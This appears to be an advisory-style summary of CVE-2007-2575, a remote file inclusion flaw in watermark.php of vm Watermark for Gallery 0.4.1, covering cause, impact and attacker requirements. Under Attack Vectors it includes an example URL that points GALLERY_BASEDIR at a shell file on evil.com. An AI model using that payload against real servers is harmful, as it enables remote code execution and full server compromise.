Based on the provided information, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2007-2575

**Root Cause of Vulnerability:**
The vulnerability is a Remote File Inclusion (RFI) flaw. The `watermark.php` script within the "vm Watermark for Gallery 0.4.1" application improperly handles the `GALLERY_BASEDIR` parameter. This allows an attacker to include a remote file, potentially executing arbitrary code.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The application fails to sanitize user-supplied input, specifically the `GALLERY_BASEDIR` parameter, when including files. This allows external files to be included.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious file, an attacker could execute arbitrary PHP code on the server. This can lead to complete compromise of the system.

**Attack Vectors:**
- **HTTP Request:** An attacker sends a crafted HTTP request to the vulnerable `watermark.php` script, specifying a malicious URL in the `GALLERY_BASEDIR` parameter.
    - Example: `http://www.site.com/[path]/watermark.php?GALLERY_BASEDIR=http://evil.com/shell.txt?`

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable web application.
- **Malicious File Hosting:** The attacker must have a server to host the malicious file intended to be included, in order to execute code on the target.

**Additional Information:**
- The vulnerability was found in "vm Watermark for Gallery 0.4.1".
- The exploit was discovered by "ThE TiGeR" and published on May 5, 2007.
- The exploit is relatively simple, requiring only a crafted URL.
